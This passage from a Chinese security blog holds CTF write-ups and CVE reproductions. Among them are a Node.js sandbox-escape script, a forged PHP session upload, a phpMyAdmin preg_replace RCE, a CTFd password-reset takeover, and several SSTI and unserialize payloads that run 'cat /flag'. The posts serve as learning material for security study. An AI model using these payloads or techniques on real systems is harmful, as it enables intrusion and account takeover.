        Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1;
    }catch(e){
        return e.get_process(()=&gt;{}).mainModule.require(&quot;child_process&quot;).execSync(&quot;cat /flag&quot;).toString();
    }
}+&#39;)()&#39;;
const content = Buffer.from(untrusted).toString(&#39;hex&#39;)
axios.get(
&#39;view-source:c3fa4d495d384a6498ef0a99a4f83c59cc9d658bef174be6.changame.ichunqiu.com/run.php?code=var+a%3d`eva`;this[`${a}l`](new+Buffer(`&#39; + content + &#39;`,`hex`).toString());&#39;
).then(p =&gt; {
    console.log(p.data)
}).catch(p =&gt; {
    console.log((p.response.data))
})
</code></pre>
<h3 id="babyupload"><a href="#babyupload" class="headerlink" title="babyupload"></a>babyupload</h3><pre><code class="php">&lt;?php
error_reporting(0);
session_save_path(&quot;/var/babyctf/&quot;);
session_start();
require_once &quot;/flag&quot;;
highlight_file(__FILE__);
if($_SESSION[&#39;username&#39;] ===&#39;admin&#39;)
{
    $filename=&#39;/var/babyctf/success.txt&#39;;
    if(file_exists($filename)){
            safe_delete($filename);
            die($flag);
    }
}
else{
    $_SESSION[&#39;username&#39;] =&#39;guest&#39;;
}
$direction = filter_input(INPUT_POST, &#39;direction&#39;);
$attr = filter_input(INPUT_POST, &#39;attr&#39;);
$dir_path = &quot;/var/babyctf/&quot;.$attr;
if($attr===&quot;private&quot;){
    $dir_path .= &quot;/&quot;.$_SESSION[&#39;username&#39;];
}
if($direction === &quot;upload&quot;){
    try{
        if(!is_uploaded_file($_FILES[&#39;up_file&#39;][&#39;tmp_name&#39;])){
            throw new RuntimeException(&#39;invalid upload&#39;);
        }
        $file_path = $dir_path.&quot;/&quot;.$_FILES[&#39;up_file&#39;][&#39;name&#39;];
        $file_path .= &quot;_&quot;.hash_file(&quot;sha256&quot;,$_FILES[&#39;up_file&#39;][&#39;tmp_name&#39;]);
        if(preg_match(&#39;/(\.\.\/|\.\.\\\\)/&#39;, $file_path)){
            throw new RuntimeException(&#39;invalid file path&#39;);
        }
        @mkdir($dir_path, 0700, TRUE);
        if(move_uploaded_file($_FILES[&#39;up_file&#39;][&#39;tmp_name&#39;],$file_path)){
            $upload_result = &quot;uploaded&quot;;
        }else{
            throw new RuntimeException(&#39;error while saving&#39;);
        }
    } catch (RuntimeException $e) {
        $upload_result = $e-&gt;getMessage();
    }
} elseif ($direction === &quot;download&quot;) {
    try{
        $filename = basename(filter_input(INPUT_POST, &#39;filename&#39;));
        $file_path = $dir_path.&quot;/&quot;.$filename;
        if(preg_match(&#39;/(\.\.\/|\.\.\\\\)/&#39;, $file_path)){
            throw new RuntimeException(&#39;invalid file path&#39;);
        }
        if(!file_exists($file_path)) {
            throw new RuntimeException(&#39;file not exist&#39;);
        }
        header(&#39;Content-Type: application/force-download&#39;);
        header(&#39;Content-Length: &#39;.filesize($file_path));
        header(&#39;Content-Disposition: attachment; filename=&quot;&#39;.substr($filename, 0, -65).&#39;&quot;&#39;);
        if(readfile($file_path)){
            $download_result = &quot;downloaded&quot;;
        }else{
            throw new RuntimeException(&#39;error while saving&#39;);
        }
    } catch (RuntimeException $e) {
        $download_result = $e-&gt;getMessage();
    }
    exit;
}
?&gt;</code></pre>
<p>因为上传目录和sess文件所在目录相同，可以伪造sess</p>
<pre><code>POST / HTTP/1.1
Host: 1b4b996742cb4d2b92d4ee548dc2c06d4ce0b9aa209948d1.changame.ichunqiu.com
Content-Length: 395
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: null
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx5uJpSmC7ijBPrtm
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: PHPSESSID=7d93710a783397f3be0ba7165a60faed;
Connection: close

------WebKitFormBoundaryx5uJpSmC7ijBPrtm
Content-Disposition: form-data; name=&quot;direction&quot;

upload
------WebKitFormBoundaryx5uJpSmC7ijBPrtm
Content-Disposition: form-data; name=&quot;attr&quot;


------WebKitFormBoundaryx5uJpSmC7ijBPrtm
Content-Disposition: form-data; name=&quot;up_file&quot;; filename=&quot;sess&quot;
Content-Type: text/plain

\x08usernames:5:&quot;admin&quot;;
------WebKitFormBoundaryx5uJpSmC7ijBPrtm--
</code></pre><p>成功伪造admin身份</p>
<p>接下来就是要弄个success.txt了，虽然我们文件名会被加个后缀</p>
<p>但是我们可以通过创建<code>success.txt</code>文件夹来达到相同效果</p>
<pre><code class="php">POST / HTTP/1.1
Host: 1b4b996742cb4d2b92d4ee548dc2c06d4ce0b9aa209948d1.changame.ichunqiu.com
Content-Length: 406
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: null
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx5uJpSmC7ijBPrtm
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: UM_distinctid=16f8014229c357-04d5c848290106-6701b35-240000-16f8014229d768; Hm_lvt_2d0601bd28de7d49818249cf35d95943=1587227364; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1587344461; PHPSESSID=7d93710a783397f3be0ba7165a60faed; __jsluid_h=7a2212833688aca0c2569475f7bdeffd
Connection: close

------WebKitFormBoundaryx5uJpSmC7ijBPrtm
Content-Disposition: form-data; name=&quot;direction&quot;

upload
------WebKitFormBoundaryx5uJpSmC7ijBPrtm
Content-Disposition: form-data; name=&quot;attr&quot;

success.txt
------WebKitFormBoundaryx5uJpSmC7ijBPrtm
Content-Disposition: form-data; name=&quot;up_file&quot;; filename=&quot;sess&quot;
Content-Type: text/plain

usernames:5:&quot;admin&quot;;
------WebKitFormBoundaryx5uJpSmC7ijBPrtm--
</code></pre>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200420103357.png" alt="image13059"></p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/04/20/2020数字中国创新大赛-虎符网络安全/">http://blog.ccreater.top/2020/04/20/2020数字中国创新大赛-虎符网络安全/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/04/20/2020%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B-%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" data-id="cka3ckr1u0007v4v08dwn5ye5" data-title="2020数字中国创新大赛-虎符网络安全" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-phpmyadmin_登陆后_rce" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/04/03/phpmyadmin_%E7%99%BB%E9%99%86%E5%90%8E_rce/" class="article-date">
  <time class="dt-published" datetime="2020-04-03T13:39:15.744Z" itemprop="datePublished">2020-04-03</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/04/03/phpmyadmin_%E7%99%BB%E9%99%86%E5%90%8E_rce/">phpmyadmin_登陆后_rce</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="phpmyadmin登陆后rce"><a href="#phpmyadmin登陆后rce" class="headerlink" title="phpmyadmin登陆后rce"></a>phpmyadmin登陆后rce</h1><h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><blockquote>
<p>在PHP5.4.7以前，<code>preg_replace</code>的第一个参数可以利用\0进行截断，并将正则模式修改为e。众所周知，e模式的正则支持执行代码，此时将可构造一个任意代码执行漏洞。</p>
<p>以下版本受到影响：</p>
<ul>
<li>4.0.10.16之前4.0.x版本</li>
<li>4.4.15.7之前4.4.x版本</li>
<li>4.6.3之前4.6.x版本（实际上由于该版本要求PHP5.5+，所以无法复现本漏洞）</li>
</ul>
</blockquote>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>全局搜索preg_replace,发现以下可能有可控变量的位置:</p>
<p>容易找到</p>
<p><code>TableSearch.lib.php</code></p>
<pre><code class="php">function _getRegexReplaceRows($columnIndex, $find, $replaceWith, $charSet)
    {
        $column = $this-&gt;_columnNames[$columnIndex];
        $sql_query = &quot;SELECT &quot;
            . PMA_Util::backquote($column) . &quot;,&quot;
            . &quot; 1,&quot; // to add an extra column that will have replaced value
            . &quot; COUNT(*)&quot;
            . &quot; FROM &quot; . PMA_Util::backquote($this-&gt;_db)
            . &quot;.&quot; . PMA_Util::backquote($this-&gt;_table)
            . &quot; WHERE &quot; . PMA_Util::backquote($column)
            . &quot; RLIKE &#39;&quot; . PMA_Util::sqlAddSlashes($find) . &quot;&#39; COLLATE &quot;
            . $charSet . &quot;_bin&quot;; // here we
            // change the collation of the 2nd operand to a case sensitive
            // binary collation to make sure that the comparison is case sensitive
        $sql_query .= &quot; GROUP BY &quot; . PMA_Util::backquote($column)
            . &quot; ORDER BY &quot; . PMA_Util::backquote($column) . &quot; ASC&quot;;

        $result = $GLOBALS[&#39;dbi&#39;]-&gt;fetchResult($sql_query, 0);

        if (is_array($result)) {
            foreach ($result as $index=&gt;$row) {
                $result[$index][1] = preg_replace(
                    &quot;/&quot; . $find . &quot;/&quot;,
                    $replaceWith,
                    $row[0]
                );
            }
        }
        return $result;
    }</code></pre>
<p>如果我们可以控制<code>$result和$replaceWith</code>那么我们就可以执行任意命令</p>
<p><img src="https://i.loli.net/2020/04/03/qo5ZbfuJHKA9d6m.png" alt="image1674"></p>
<p>我们先看<code>getReplacePreview</code></p>
<p><img src="https://i.loli.net/2020/04/03/vnk9IZUxJ5YoMbW.png" alt="image1764"></p>
<p>再查看调用<code>getReplacePreview</code>的函数</p>
<p><img src="https://i.loli.net/2020/04/03/JxKS1TioFz4w7ql.png" alt="image1858"></p>
<p>去看第二个和第三个明显不行,这里就不贴出来了</p>
<p>再跟进<code>tbl_find_replace.php</code></p>
<pre><code class="php">if (isset($_POST[&#39;find&#39;])) {
    $preview = $table_search-&gt;getReplacePreview(
        $_POST[&#39;columnIndex&#39;],
        $_POST[&#39;find&#39;],
        $_POST[&#39;replaceWith&#39;],
        $_POST[&#39;useRegex&#39;],
        $connectionCharSet
    );
    $response-&gt;addJSON(&#39;preview&#39;, $preview);
    exit;
}</code></pre>
<p>明显白给</p>
<p>我们再回到<code>_getRegexReplaceRows</code>去查看它的第二个调用函数</p>
<p><img src="https://i.loli.net/2020/04/03/OhCPcviVT8tm6ZK.png" alt="image2318"></p>
<p>再查看调用replace的函数</p>
<p><img src="https://i.loli.net/2020/04/03/zT21ymqOYvUf5WE.png" alt="image2400"></p>
<p>同样后面两个还是不行</p>
<p>在跟进<code>tbl_find_replace.php</code></p>
<p><img src="https://i.loli.net/2020/04/03/j4JdNfKa8up2BCc.png" alt="image2504"></p>
<p>还是白给,两个调用链都是可以rce的,我们以前面那个为例</p>
<p>先往表中添加一条数据<code>INSERT INTO</code>flags<code>(</code>username<code>,</code>flag<code>,</code>msgid<code>) VALUES (UNHEX(&#39;302F6500&#39;),1,1);</code></p>
<p>直接抓包,修改</p>
<p><img src="https://i.loli.net/2020/04/03/FwSzMuNI4nDadBh.png" alt="image2701"></p>
<p><img src="https://i.loli.net/2020/04/03/QZE5fMTnUhPXdqV.png" alt="image2768"></p>
<p>成功</p>
<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><p>这个poc直接抄个别人的,懒得写了</p>
<p><code>https://www.exploit-db.com/exploits/40185</code></p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/04/03/phpmyadmin_登陆后_rce/">http://blog.ccreater.top/2020/04/03/phpmyadmin_登陆后_rce/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/04/03/phpmyadmin_%E7%99%BB%E9%99%86%E5%90%8E_rce/" data-id="cka3ckr38003fv4v0bdtl7mnw" data-title="phpmyadmin_登陆后_rce" class="article-share-link">Share</a>
      
	  
      
      
    </footer>
  </div>
  
</article>





  
    <article id="post-CTFd任意密码重置复现" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/04/01/CTFd%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E5%A4%8D%E7%8E%B0/" class="article-date">
  <time class="dt-published" datetime="2020-04-01T10:40:44.718Z" itemprop="datePublished">2020-04-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/04/01/CTFd%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E5%A4%8D%E7%8E%B0/">CTFd任意密码重置复现</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="CTFd任意密码重置复现"><a href="#CTFd任意密码重置复现" class="headerlink" title="CTFd任意密码重置复现"></a>CTFd任意密码重置复现</h1><p>今天刚好做到一题CTFd的就顺便复现下</p>
<p>这是补丁的信息:<code>Strip spaces on registration and refine password reset</code></p>
<p>根据补丁信息去找register的代码</p>
<pre><code class="python">def register():
    errors = get_errors()
    if request.method == &quot;POST&quot;:
        name = request.form[&quot;name&quot;]
        email_address = request.form[&quot;email&quot;]
        password = request.form[&quot;password&quot;]

        name_len = len(name) == 0
        names = Users.query.add_columns(&quot;name&quot;, &quot;id&quot;).filter_by(name=name).first()
        emails = (
            Users.query.add_columns(&quot;email&quot;, &quot;id&quot;)
            .filter_by(email=email_address)
            .first()
        )
        pass_short = len(password.strip()) == 0
        pass_long = len(password) &gt; 128
        valid_email = validators.validate_email(request.form[&quot;email&quot;])
        team_name_email_check = validators.validate_email(name)

        if not valid_email:
            errors.append(&quot;Please enter a valid email address&quot;)
        if email.check_email_is_whitelisted(email_address) is False:
            errors.append(
                &quot;Only email addresses under {domains} may register&quot;.format(
                    domains=get_config(&quot;domain_whitelist&quot;)
                )
            )
        if names:
            errors.append(&quot;That user name is already taken&quot;)
        if team_name_email_check is True:
            errors.append(&quot;Your user name cannot be an email address&quot;)
        if emails:
            errors.append(&quot;That email has already been used&quot;)
        if pass_short:
            errors.append(&quot;Pick a longer password&quot;)
        if pass_long:
            errors.append(&quot;Pick a shorter password&quot;)
        if name_len:
            errors.append(&quot;Pick a longer user name&quot;)

        if len(errors) &gt; 0:
            return render_template(
                &quot;register.html&quot;,
                errors=errors,
                name=request.form[&quot;name&quot;],
                email=request.form[&quot;email&quot;],
                password=request.form[&quot;password&quot;],
            )
        else:
            with app.app_context():
                user = Users(
                    name=name.strip(),
                    email=email_address.lower(),
                    password=password.strip(),
                )
                db.session.add(user)
                db.session.commit()
                db.session.flush()

                login_user(user)

                if config.can_send_mail() and get_config(
                    &quot;verify_emails&quot;
                ):  # Confirming users is enabled and we can send email.
                    log(
                        &quot;registrations&quot;,
                        format=&quot;[{date}] {ip} - {name} registered (UNCONFIRMED) with {email}&quot;,
                    )
                    email.verify_email_address(user.email)
                    db.session.close()
                    return redirect(url_for(&quot;auth.confirm&quot;))
                else:  # Don&#39;t care about confirming users
                    if (
                        config.can_send_mail()
                    ):  # We want to notify the user that they have registered.
                        email.sendmail(
                            request.form[&quot;email&quot;],
                            &quot;You&#39;ve successfully registered for {}&quot;.format(
                                get_config(&quot;ctf_name&quot;)
                            ),
                        )

        log(&quot;registrations&quot;, &quot;[{date}] {ip} - {name} registered with {email}&quot;)
        db.session.close()

        if is_teams_mode():
            return redirect(url_for(&quot;teams.private&quot;))

        return redirect(url_for(&quot;challenges.listing&quot;))
    else:
        return render_template(&quot;register.html&quot;, errors=errors)
</code></pre>
<p>阅读代码发现,查询用户名是否重复是直接将我们的输入拿去查询</p>
<pre><code class="python">        name = request.form[&quot;name&quot;]
        email_address = request.form[&quot;email&quot;]
        password = request.form[&quot;password&quot;]

        name_len = len(name) == 0
        names = Users.query.add_columns(&quot;name&quot;, &quot;id&quot;).filter_by(name=name).first()#这里这里
        emails = (
            Users.query.add_columns(&quot;email&quot;, &quot;id&quot;)
            .filter_by(email=email_address)
            .first()
        )
        if names:
            errors.append(&quot;That user name is already taken&quot;)</code></pre>
<p>而验证没有重复后,则将我们输入的用户名strip后,在添加到数据库,也就是说我们可以在数据库弄多个同名账号</p>
<pre><code class="python">            user = Users(
                    name=name.strip(),
                    email=email_address.lower(),
                    password=password.strip(),
                )</code></pre>
<p>CTFd重置密码会收到这样的email</p>
<pre><code>Did you initiate a password reset? Click the following link to reset your password:

http://f04e02df-7759-45ba-a2b2-b89399e91ca0.node3.buuoj.cn/reset_password/ImFkbWluIg.XoRn7w.CDy8yi95cLlHsZN_YRiCp9Z-mX4</code></pre><p>我们去找<code>/reset_password/&lt;xxx&gt;</code>的路由</p>
<pre><code class="python">@auth.route(&quot;/reset_password&quot;, methods=[&quot;POST&quot;, &quot;GET&quot;])
@auth.route(&quot;/reset_password/&lt;data&gt;&quot;, methods=[&quot;POST&quot;, &quot;GET&quot;])
@ratelimit(method=&quot;POST&quot;, limit=10, interval=60)
def reset_password(data=None):
    if data is not None:
        try:
            name = unserialize(data, max_age=1800)
        except (BadTimeSignature, SignatureExpired):
            return render_template(
                &quot;reset_password.html&quot;, errors=[&quot;Your link has expired&quot;]
            )
        except (BadSignature, TypeError, base64.binascii.Error):
            return render_template(
                &quot;reset_password.html&quot;, errors=[&quot;Your reset token is invalid&quot;]
            )
        if request.method == &quot;GET&quot;:
            return render_template(&quot;reset_password.html&quot;, mode=&quot;set&quot;)
        if request.method == &quot;POST&quot;:
            user = Users.query.filter_by(name=name).first_or_404()
            user.password = request.form[&quot;password&quot;].strip()
            db.session.commit()
            log(
                &quot;logins&quot;,
                format=&quot;[{date}] {ip} -  successful password reset for {name}&quot;,
                name=name,
            )
            db.session.close()
            return redirect(url_for(&quot;auth.login&quot;))</code></pre>
<p>我们发现,重置密码是根据用户名查出的第一个记录进行修改<code>user = Users.query.filter_by(name=name).first_or_404()</code></p>
<p>这样我们就成功覆盖了之前真实用户的密码而不是我们创建的用户</p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/04/01/CTFd任意密码重置复现/">http://blog.ccreater.top/2020/04/01/CTFd任意密码重置复现/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/04/01/CTFd%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E5%A4%8D%E7%8E%B0/" data-id="cka3ckr20000gv4v0ag8cb0uo" data-title="CTFd任意密码重置复现" class="article-share-link">Share</a>
      
	  
      
      
    </footer>
  </div>
  
</article>





  
    <article id="post-3月做题" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/04/01/3%E6%9C%88%E5%81%9A%E9%A2%98/" class="article-date">
  <time class="dt-published" datetime="2020-04-01T09:49:54.431Z" itemprop="datePublished">2020-04-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/">做题笔记</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/04/01/3%E6%9C%88%E5%81%9A%E9%A2%98/">3月做题</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="3月做题"><a href="#3月做题" class="headerlink" title="3月做题"></a>3月做题</h1><h2 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h2><pre><code class="php">&lt;?php

$function = @$_GET[&#39;f&#39;];

function filter($img){
    $filter_arr = array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);
    $filter = &#39;/&#39;.implode(&#39;|&#39;,$filter_arr).&#39;/i&#39;;
    return preg_replace($filter,&#39;&#39;,$img);
}


if($_SESSION){
    unset($_SESSION);
}

$_SESSION[&quot;user&quot;] = &#39;guest&#39;;
$_SESSION[&#39;function&#39;] = $function;

extract($_POST);

if(!$function){
    echo &#39;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#39;;
}

if(!$_GET[&#39;img_path&#39;]){
    $_SESSION[&#39;img&#39;] = base64_encode(&#39;guest_img.png&#39;);
}else{
    $_SESSION[&#39;img&#39;] = sha1(base64_encode($_GET[&#39;img_path&#39;]));
}

$serialize_info = filter(serialize($_SESSION));

if($function == &#39;highlight_file&#39;){
    highlight_file(&#39;index.php&#39;);
}else if($function == &#39;phpinfo&#39;){
    eval(&#39;phpinfo();&#39;); //maybe you can find something in here!
}else if($function == &#39;show_image&#39;){
    $userinfo = unserialize($serialize_info);
    echo file_get_contents(base64_decode($userinfo[&#39;img&#39;]));
}</code></pre>
<pre><code class="php">function filter($img){
    $filter_arr = array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);
    $filter = &#39;/&#39;.implode(&#39;|&#39;,$filter_arr).&#39;/i&#39;;
    return preg_replace($filter,&#39;&#39;,$img);
}
extract($_POST);
$_SESSION[&#39;img&#39;] = base64_encode(&#39;guest_img.png&#39;);
$serialize_info = filter(serialize($_SESSION));
$userinfo = unserialize($serialize_info);
echo file_get_contents(base64_decode($userinfo[&#39;img&#39;]));</code></pre>
<p>我们利用filter来吞掉一些字符,从而让我们任意反序列化</p>
<p><code>POST: _SESSION[abc]=flagflagphpphpphp&amp;_SESSION[aaa]=;s:3:&quot;img&quot;;s:12:&quot;aW5kZXgucGhw&quot;;s:1:&quot;a&quot;;s:1:&quot;a&quot;;}</code></p>
<p>我们分析一下为什么是这个payload:</p>
<p>…</p>
<p>在phpinfo中找到</p>
<table>
<thead>
<tr>
<th>config</th>
<th>Local Value</th>
<th>Mastr Value</th>
</tr>
</thead>
<tbody><tr>
<td>auto_append_file</td>
<td>d0g3_f1ag.php</td>
<td>d0g3_f1ag.php</td>
</tr>
</tbody></table>
<pre><code>_SESSION[abc]=flagflagphpphpphp&amp;_SESSION[aaa]=;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:1:&quot;a&quot;;s:1:&quot;a&quot;;}
_SESSION[abc]=flagflagphpphpphp&amp;_SESSION[aaa]=;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;s:1:&quot;a&quot;;s:1:&quot;a&quot;;}</code></pre><pre><code class="php">
&lt;?php

$flag = &#39;flag in /d0g3_fllllllag&#39;;

?&gt;</code></pre>
<p><code>flag{62b16099-c29d-499a-9dde-e54bf2985b31}</code></p>
<h2 id="easymd5"><a href="#easymd5" class="headerlink" title="easymd5"></a>easymd5</h2><pre><code>select * from &#39;admin&#39; where password=md5($pass,true)</code></pre><p>md5($var,true)会返回一个原始的二进制数据，某些数据会被当成字符串</p>
<blockquote>
<p>raw MD5 hashes are dangerous in SQL statements because they can contain characters with special meaning to MySQL(原始值会包含mysql中的特殊字符，因此很危险）。</p>
</blockquote>
<p>   特殊字符串:</p>
<blockquote>
<p>129581926211651571912466741651878684928<br>ffifdyop</p>
</blockquote>
<h2 id="Mark-loves-cat"><a href="#Mark-loves-cat" class="headerlink" title="Mark loves cat"></a>Mark loves cat</h2><pre><code class="php">&lt;?php

include &#39;flag.php&#39;;

$yds = &quot;dog&quot;;
$is = &quot;cat&quot;;
$handsome = &#39;yds&#39;;

foreach($_POST as $x =&gt; $y){
    $$x = $y;
}

foreach($_GET as $x =&gt; $y){
    $$x = $$y;
}
#$x=handsome $y=flag
foreach($_GET as $x =&gt; $y){
    if($_GET[&#39;flag&#39;] === $x &amp;&amp; $x !== &#39;flag&#39;){
        exit($handsome);
    }
}

if(!isset($_GET[&#39;flag&#39;]) &amp;&amp; !isset($_POST[&#39;flag&#39;])){
    exit($yds);
}

if($_POST[&#39;flag&#39;] === &#39;flag&#39;  || $_GET[&#39;flag&#39;] === &#39;flag&#39;){
    exit($is);
}



echo &quot;the flag is: &quot;.$flag;</code></pre>
<p><code>/index.php?yds=flag</code></p>
<h2 id="The-mystery-of-ip"><a href="#The-mystery-of-ip" class="headerlink" title="The mystery of ip"></a>The mystery of ip</h2><p>根据题目的提示,修改xff头,发现可以修改ip,但是修改成127.0.0.1后没有啥东西</p>
<p>后来在fuzz的过程中发现,有ssti漏洞</p>
<pre><code>GET /flag.php HTTP/1.1
Host: node3.buuoj.cn:27223
Upgrade-Insecure-Requests: 1
X-Forwarded-For: {system(&#39;cat /flag&#39;)}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://node3.buuoj.cn:27223/
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: PHPSESSID=gppova7f172e56f11qlrffpb64; JSESSIONID=0740A2433DEA975EE0C0C0CC0D0257D0
Connection: close</code></pre><h2 id="ZJCTF，不过如此"><a href="#ZJCTF，不过如此" class="headerlink" title="ZJCTF，不过如此"></a>ZJCTF，不过如此</h2><pre><code class="php">&lt;?php

error_reporting(0);
$text = $_GET[&quot;text&quot;];
$file = $_GET[&quot;file&quot;];
if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;I have a dream&quot;)){
    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#39;r&#39;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;
    if(preg_match(&quot;/flag/&quot;,$file)){
        die(&quot;Not now!&quot;);
    }

    include($file);  //next.php

}
else{
    highlight_file(__FILE__);
}
?&gt;</code></pre>
<pre><code>http://e121170e-2c2b-419c-909f-05b530db4272.node3.buuoj.cn/?text=data://text/plain,I%20have%20a%20dream&amp;file=next.php</code></pre><p>next.php</p>
<pre><code class="php">&lt;?php
$id = $_GET[&#39;id&#39;];
$_SESSION[&#39;id&#39;] = $id;

function complex($re, $str) {
    return preg_replace(
        &#39;/(&#39; . $re . &#39;)/ei&#39;,
        &#39;strtolower(&quot;\\1&quot;)&#39;,
        $str
    );
}


foreach($_GET as $re =&gt; $str) {
    echo complex($re, $str). &quot;\n&quot;;
}

function getFlag(){
    @eval($_GET[&#39;cmd&#39;]);
}
</code></pre>
<pre><code>http://e121170e-2c2b-419c-909f-05b530db4272.node3.buuoj.cn/?&amp;\D*=${getFlag()}&amp;file=next.php&amp;text=data://,I%20have%20a%20dream&amp;cmd=system(%27cat%20/flag%27);</code></pre><h2 id="Cookie-is-so-stable"><a href="#Cookie-is-so-stable" class="headerlink" title="Cookie is so stable"></a>Cookie is so stable</h2><p>根据提示发现</p>
<pre><code>Cookie: PHPSESSID=30c6cb67d4e030c673ad2fa83c35cbc7; user=admin</code></pre><p>fuzz过程中猜测是ssti</p>
<p><img src="https://portswigger.net/cms/images/migration/blog/screen-shot-2015-07-20-at-09-21-56.png" alt="image4749"></p>
<p>检测出是twig</p>
<pre><code>Cookie: PHPSESSID=30c6cb67d4e030c673ad2fa83c35cbc7; user={{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}</code></pre><h2 id="EasySearch"><a href="#EasySearch" class="headerlink" title="EasySearch"></a>EasySearch</h2><p>在index.php.swp中找到源码</p>
<pre><code class="php">&lt;?php
    ob_start();
    function get_hash(){
        $chars = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#39;;
        $random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times
        $content = uniqid().$random;
        return sha1($content); 
    }
